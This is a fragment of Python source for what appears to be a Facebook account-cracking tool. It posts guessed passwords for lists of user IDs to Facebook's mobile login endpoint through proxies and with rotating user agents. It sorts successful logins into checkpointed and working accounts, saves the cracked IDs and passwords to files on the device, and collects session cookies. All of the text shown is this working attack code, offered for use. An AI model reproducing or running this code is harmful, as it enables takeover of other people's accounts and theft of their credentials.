            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':uaku(),'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=bro)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[BLACK-Cp🌺]✅Uid┏━➤ {idf} 🔑Pass┏━➤{pw}')
                print(ua)
                open('/sdcard/BLACKM2CP.txt', 'a').write( idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;96m[BLACK-Ok🌸] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\033[0;91m[😈]= UA • \033[0;91m{ua} ')
                open('/sdcard/BLACKM2OK.txt', 'a').write( idf+' • '+pw+' | '+ua+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(50)
    loop+=1
 
#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
if __name__=='__main__':
    try:os.system('touch .prox.txt')
    except:pass
menu()

#-----------------------[ SYSTEM-CONTROL ]--------------------#